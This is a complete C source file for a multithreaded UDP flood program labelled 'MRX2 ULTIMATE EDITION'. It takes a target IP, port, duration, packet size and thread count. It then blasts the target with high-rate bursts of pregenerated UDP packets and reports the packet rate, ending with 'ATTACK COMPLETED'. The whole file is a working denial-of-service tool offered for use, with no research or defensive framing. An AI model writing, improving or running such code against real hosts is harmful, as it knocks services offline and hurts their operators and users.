#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic unsigned long long packets_dropped = 0;
pthread_t monitor_thread;
int monitor_running = 1;

#define MAX_WORKER_THREADS 128
#define IO_MULTIPLIER 2
#define PREGEN_PACKET_COUNT 128
#define MAX_SOCKET_BUFFER (100 * 1024 * 1024)
#define BURST_SIZE_MULTIPLIER 4

typedef struct {
    uint32_t timestamp;
    uint16_t packet_id;
    uint8_t packet_type;
    uint8_t flags;
    uint32_t sequence;
    uint32_t checksum;
} udp_header_t;

typedef struct {
    int thread_id;
    int worker_id;
    uint64_t packets_sent;
    uint64_t bytes_sent;
    int sock_fd;
    char *pregen_buffer;
    struct sockaddr_in target_addr;
} worker_context_t;

static worker_context_t workers[MAX_WORKER_THREADS];
static char *pregen_packets[PREGEN_PACKET_COUNT];
static int active_workers = 0;

void set_thread_affinity(int cpu_id) {
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    int cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpu_count > 0) {
        CPU_SET(cpu_id % cpu_count, &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    }
#endif
}

void init_pregen_packets() {
    for (int i = 0; i < PREGEN_PACKET_COUNT; i++) {
        pregen_packets[i] = malloc(PACKET_SIZE);
        if (pregen_packets[i]) {
            udp_header_t *hdr = (udp_header_t *)pregen_packets[i];
            hdr->packet_type = 0xA1;
            hdr->flags = 0xC3;
            
            for (int j = sizeof(udp_header_t); j < PACKET_SIZE; j++) {
                pregen_packets[i][j] = (char)((i + j * 7) & 0xFF);
            }
        }
    }
}

void cleanup_pregen_packets() {
    for (int i = 0; i < PREGEN_PACKET_COUNT; i++) {
        if (pregen_packets[i]) {
            free(pregen_packets[i]);
            pregen_packets[i] = NULL;
        }
    }
}

int setup_socket() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) return -1;
    
    int enable = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &enable, sizeof(enable));
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable));
    
    int sndbuf = MAX_SOCKET_BUFFER;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
    
    return sockfd;
}

void *worker_thread(void *arg) {
    worker_context_t *ctx = (worker_context_t *)arg;
    set_thread_affinity(ctx->thread_id);
    
    time_t start_time = time(NULL);
    int packet_index = ctx->thread_id % PREGEN_PACKET_COUNT;
    int burst_counter = 0;
    
    while (time(NULL) - start_time < DURATION_TIME) {
        burst_counter++;
        
        int burst_size = BURST_SIZE_MULTIPLIER * (1 + (ctx->thread_id % 3));
        
        for (int i = 0; i < burst_size; i++) {
            if (!pregen_packets[packet_index]) {
                char temp_packet[PACKET_SIZE];
                memset(temp_packet, (packet_index + i) & 0xFF, PACKET_SIZE);
                sendto(ctx->sock_fd, temp_packet, PACKET_SIZE, MSG_DONTWAIT,
                      (struct sockaddr *)&ctx->target_addr, sizeof(ctx->target_addr));
            } else {
                udp_header_t *hdr = (udp_header_t *)pregen_packets[packet_index];
                hdr->timestamp = (uint32_t)time(NULL);
                hdr->packet_id = ctx->thread_id;
                hdr->sequence = ctx->packets_sent;
                hdr->checksum = (hdr->timestamp + hdr->sequence) ^ 0xDEADBEEF;
                
                sendto(ctx->sock_fd, pregen_packets[packet_index], PACKET_SIZE, MSG_DONTWAIT,
                      (struct sockaddr *)&ctx->target_addr, sizeof(ctx->target_addr));
            }
            
            ctx->packets_sent++;
            packet_index = (packet_index + 1) % PREGEN_PACKET_COUNT;
            
            if (i % 8 == 0) {
                sched_yield();
            }
        }
        
        ctx->bytes_sent += burst_size * PACKET_SIZE;
        
        if (burst_counter % 10 == 0) {
            struct timespec ts = {0, 1000};
            nanosleep(&ts, NULL);
        }
        
        if (ctx->packets_sent % 1000 == 0) {
            atomic_fetch_add(&total_packets, 1000);
            atomic_fetch_add(&total_bytes, 1000 * PACKET_SIZE);
        }
    }
    
    atomic_fetch_add(&total_packets, ctx->packets_sent);
    atomic_fetch_add(&total_bytes, ctx->bytes_sent);
    
    close(ctx->sock_fd);
    return NULL;
}

void *stats_monitor(void *arg) {
    unsigned long long prev_packets = 0;
    unsigned long long prev_bytes = 0;
    time_t last_update = time(NULL);
    int update_interval = 2;
    
    while (monitor_running) {
        sleep(1);
        
        unsigned long long current_packets = atomic_load(&total_packets);
        unsigned long long current_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = current_packets - prev_packets;
        unsigned long long bps = current_bytes - prev_bytes;
        
        prev_packets = current_packets;
        prev_bytes = current_bytes;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        if (time(NULL) - last_update >= update_interval) {
            unsigned long long pps_k = pps / 1000;
            unsigned long long peak_k = atomic_load(&peak_pps) / 1000;
            unsigned long long bps_mb = bps / (1024 * 1024);
            
            fprintf(stderr, "LIVE:%lluK/s | PEAK:%lluK/s | BW:%lluMB/s | WORKERS:%d/%d\n",
                   pps_k, peak_k, bps_mb, active_workers, THREAD_COUNT);
            fflush(stderr);
            last_update = time(NULL);
        }
    }
    return NULL;
}

void usage() {
    fprintf(stderr, "Usage: ./mrx2 [IP] [PORT] [TIME] [SIZE] [THREADS]\n");
    fprintf(stderr, "Example: ./mrx2 192.168.1.1 7777 60 1400 500\n");
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        usage();
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (TARGET_PORT <= 0 || DURATION_TIME <= 0 || 
        PACKET_SIZE <= 0 || THREAD_COUNT <= 0) {
        fprintf(stderr, "Invalid parameters\n");
        usage();
    }
    
    if (THREAD_COUNT > MAX_WORKER_THREADS) {
        THREAD_COUNT = MAX_WORKER_THREADS;
        fprintf(stderr, "Warning: Threads limited to %d\n", MAX_WORKER_THREADS);
    }
    
    if (PACKET_SIZE > 65507) PACKET_SIZE = 65507;
    if (PACKET_SIZE < 64) PACKET_SIZE = 64;
    
    fprintf(stderr, "MRX2 ULTIMATE EDITION\n");
    fprintf(stderr, "Target: %s:%d | Time: %ds | Size: %d | Threads: %d\n\n",
            TARGET_IP, TARGET_PORT, DURATION_TIME, PACKET_SIZE, THREAD_COUNT);
    
    init_pregen_packets();
    
    pthread_t threads[MAX_WORKER_THREADS];
    memset(workers, 0, sizeof(workers));
    
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    target_addr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    active_workers = 0;
    for (int i = 0; i < THREAD_COUNT; i++) {
        workers[i].thread_id = i;
        workers[i].worker_id = i;
        workers[i].sock_fd = setup_socket();
        workers[i].target_addr = target_addr;
        
        if (workers[i].sock_fd < 0) {
            fprintf(stderr, "Failed to create socket for thread %d\n", i);
            continue;
        }
        
        if (pthread_create(&threads[i], NULL, worker_thread, &workers[i]) == 0) {
            active_workers++;
        }
        
        if (i % 10 == 0 && i > 0) {
            usleep(1000);
        }
    }
    
    fprintf(stderr, "Started %d/%d worker threads\n\n", active_workers, THREAD_COUNT);
    
    sleep(DURATION_TIME);
    monitor_running = 0;
    
    for (int i = 0; i < active_workers; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_thread, NULL);
    
    unsigned long long final_packets = atomic_load(&total_packets);
    unsigned long long final_bytes = atomic_load(&total_bytes);
    unsigned long long final_peak = atomic_load(&peak_pps);
    unsigned long long avg_pps = final_packets / DURATION_TIME;
    double avg_mbps = (final_bytes * 8.0) / (DURATION_TIME * 1024 * 1024);
    
    fprintf(stderr, "\nATTACK COMPLETED\n");
    fprintf(stderr, "Total Packets: %llu (%.1fM)\n", 
            final_packets, final_packets / 1000000.0);
    fprintf(stderr, "Total Data: %.2f MB\n", 
            final_bytes / (1024.0 * 1024.0));
    fprintf(stderr, "Average PPS: %lluK/s\n", avg_pps / 1000);
    fprintf(stderr, "Peak PPS: %lluK/s\n", final_peak / 1000);
    fprintf(stderr, "Average Bandwidth: %.2f Mbps\n", avg_mbps);
    fprintf(stderr, "Successful Workers: %d/%d\n", active_workers, THREAD_COUNT);
    
    cleanup_pregen_packets();
    
    return 0;
}